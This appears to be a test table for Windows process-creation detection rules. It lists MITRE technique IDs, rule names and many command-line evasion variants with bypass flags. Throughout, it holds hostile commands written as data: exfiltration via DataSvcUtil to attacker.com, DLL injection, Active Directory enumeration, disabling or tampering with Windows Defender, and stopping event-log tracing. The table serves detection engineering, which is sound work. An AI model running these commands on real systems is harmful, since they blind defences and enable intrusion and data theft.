Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		DataSvcUtil.exe -uri http://attacker.com -out C:\Windows\Temp\proxy.cs -in C:\Windows\Temp\input.cs	FALSE	FALSE	FALSE	
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		DataSvcUtil.exe /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs in:C:\Windows\Temp\input.cs	FALSE	FALSE	FALSE	
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		DataSvcUtil.exe /uri:http://attacker.com out:C:\Windows\Temp\proxy.cs in:C:\Windows\Temp\input.cs	FALSE	FALSE	FALSE	
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		"DataSvcUtil.exe"" /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs /in:C:\Windows\Temp\input.cs"	FALSE	FALSE	FALSE	
t1218.002	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		control.exe malicious.cpl	FALSE	FALSE	FALSE	
t1218.002	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		control.exe payload.dll	FALSE	FALSE	FALSE	
t1218.002	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		"reg.exe   add   ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs""   /v   ""Exploit""   /t   REG_SZ   /d   ""test.cpl"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\akew4mzz\akew4mzz.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /fullpaths /noconfig @""C:\Users\thaim\AppData\Local\Temp\akew4mzz\akew4mzz.cmdline"""	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		csvde.exe -f C:\Users\Public\ad_export.csv	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		csvde.exe -fC:\Users\Public\ad_export.csv	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		"csvde.exe -f ""C:\Users\Public\ad_export.csv"""	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		csvde.exe -f C:\Users\Public\ad_export.csv -i	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		csvde.exe -f C:\Users\Public\ad_export.csv -i -f C:\Users\Public\real_export.csv	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -sc admincountdmp	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -sc exchaddresses	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		adfind.exe -sc admincountdmp	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		adfind.exe -sc exchaddresses	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"dctask64.exe -executecmd64 ""whoami"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		dctask64.exe -executecmd64:whoami	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"dctask64.exe -""execute""cmd64 ""whoami"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"dctask64.exe -executecmd64 ""whoami"" > NUL"	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		dctask64.exe -executecmd64 `echo whoami`	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		mavinject.exe 1234 /INJECTRUNNING\\tevil.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		"mavinject.exe 1234 /INJECTRUNNING\""tevil.dll"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_tracker	Potential DLL Injection Or Execution Using Tracker.exe	148431ce-4b70-403d-8525-fcc2993f29ea		Tracker.exe /ERRORREPORT:PROMPT /d malicious.dll /c calc.exe	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -c ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""Remove-Item 'HKCR\*\shellex\ContextMenuHandlers\EPP'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm HKCR:\*\shellex\ContextMenuHandlers\EPP"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -WindowStyle Hidden"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -ExecutionPolicy Bypass"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -NonInteractive"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"pwsh -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" | Out-Null"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -Verb RunAs"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		dism.exe /Online /Disable-Feature -FeatureName:Windows-Defender /Quiet /NoRestart	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		dism.exe /Online -Disable-Feature /FeatureName:Windows-Defender /NoRestart /Quiet	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Quiet /NoRestart	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		"logman.exe stop  ""Circular Kernel Context Logger"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		logman.exe delete EventLog-System	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		"logman.exe -stop ""SYSMON TRACE"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		logman.exe delete SysmonDnsEtwSession	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		logman.exe stop EventLog-Application	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_mpcmdrun_remove_windows_defender_definition	Windows Defender Definition Files Removed	9719a8aa-401c-41af-8108-ced7ec9cd75c		MpCmdRun.exe -RemoveDefinitions -All	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_mpcmdrun_remove_windows_defender_definition	Windows Defender Definition Files Removed	9719a8aa-401c-41af-8108-ced7ec9cd75c		MpCmdRun.exe /RemoveDefinitions /All	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_mpcmdrun_remove_windows_defender_definition	Windows Defender Definition Files Removed	9719a8aa-401c-41af-8108-ced7ec9cd75c		"MpCmdRun.exe"" /RemoveDefinitions /All"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		"powershell.exe -EncodedCommand ""UwBlAHQALQBNAHAARQByAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAB0AGUAcwB0AA=="""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		"powershell.exe -Command ""Set-MpPreference -ExclusionPath 'C:\test'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		"powershell.exe -c ""Set-MpPreference -ExclusionPath C:\\test"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		powershell.exe -EncodedCommand UwBlAHQALQBNAHAARQByAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAB0AGUAcwB0AA==	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_disable_feature	Powershell Defender Disable Scan Feature	1ec65a5f-9473-4f12-97da-622044d6df21		"powershell.exe -Command ""Set-MpPreference -DisableRealtimeMonitoring 1"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionPath 'C:\\Temp'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionPath C:\\Temp"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionPath `""C:\\Temp`"""""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionPath C:\\Temp\"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Set-MpPreference -ExclusionPath 'C:\\Temp'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe -Command Set-MpPreference -DisableBehaviorMonitoring $true	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring 1	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		pwsh.exe Set-MpPreference -DisableBehaviorMonitoring $true	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe -c Set-MpPreference -DisableBehaviorMonitoring $true	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -DisableRuntimeMonitoring $true	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true | Out-Null	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -WarningAction SilentlyContinue	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -Verbose	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -Debug	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize"" -Value 2"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		New-ItemProperty -Path 'HKCU\Software\Microsoft\Internet Explorer\Main' -PropertyType DWord -Name 'DisableFirstRunCustomize' -Value 2	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -Name ""DisableFirstRunCustomize"" -Value 2 -PropertyType DWord"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize`"" -Value 2"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"Set-ItemProperty -Path ""HKLM\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name ""IEHarden"" -Value 0"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"Set-ItemProperty -Path ""HKLM\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name 'IEHarden' -Value 0"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"reg add ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}"" /v IsInstalled /t REG_DWORD /d 0 /f"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		reg add 'HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}' /v IsInstalled /t REG_DWORD /d 0 /f	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"reg add ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}"" /f /v IsInstalled /t REG_DWORD /d 0"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\'"" -WindowStyle Hidden"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""& { Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\' }"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders C:\"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""Set-Item -Path 'function:\Remove-MpPreference' -Value { param($a) Write-Host 'Simulated' } ; Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""& (Get-Command Remove-MpPreference) -ControlledFolderAccessProtectedFolders 'C:\'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -Command ""Invoke-Expression 'Remove-MpPreference -ControlledFolderAccessProtectedFolders C:\'"""	FALSE	FALSE	FALSE	
